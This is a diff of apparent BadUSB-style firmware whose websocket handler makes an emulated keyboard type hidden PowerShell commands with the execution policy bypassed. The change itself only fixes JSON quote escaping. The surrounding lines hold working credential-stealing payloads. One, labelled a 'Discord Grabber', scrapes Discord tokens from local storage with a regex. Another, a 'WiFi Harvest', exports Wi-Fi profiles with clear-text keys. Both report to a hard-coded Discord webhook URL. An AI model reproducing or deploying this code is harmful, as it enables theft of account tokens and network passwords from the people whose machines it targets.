@@ -611,7 +611,7 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         Keyboard.print(
             "powershell -w h -nop -ep bypass -c \""
             "$f=$env:TEMP+'\\d.txt';"
-            "Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1480962111373840517/0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-ciyqaBjdfxN4zgmmvD3' -Method Post -ContentType 'application/json' -Body '{\\\"content\\\":\\\"=== Discord Grabber Initiated ===\\\"}';"
+            "Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1480962111373840517/0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-ciyqaBjdfxN4zgmmvD3' -Method Post -ContentType 'application/json' -Body '{\"content\":\"=== Discord Grabber Initiated ===\"}';"
             "$p=$env:APPDATA+'\\discord\\Local Storage\\leveldb';"
             "if(Test-Path $p){"
             "Get-ChildItem -Path $p -Include *.ldb,*.log -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern '[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}' | ForEach-Object { $_.Matches.Value } | Sort-Object -Unique > $f;"
@@ -641,7 +641,7 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         Keyboard.print(
             "powershell -w h -nop -ep bypass -c \""
             "$w=$env:TEMP+'\\WIFI';"
-            "Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1480962111373840517/0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-ciyqaBjdfxN4zgmmvD3' -Method Post -ContentType 'application/json' -Body '{\\\"content\\\":\\\"=== WiFi Harvest Initiated ===\\\"}';"
+            "Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1480962111373840517/0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-ciyqaBjdfxN4zgmmvD3' -Method Post -ContentType 'application/json' -Body '{\"content\":\"=== WiFi Harvest Initiated ===\"}';"
             "mkdir $w -Force;"
             "netsh wlan export profile key=clear folder=$w;"
             "if(@(Get-ChildItem $w).Count -gt 0){"
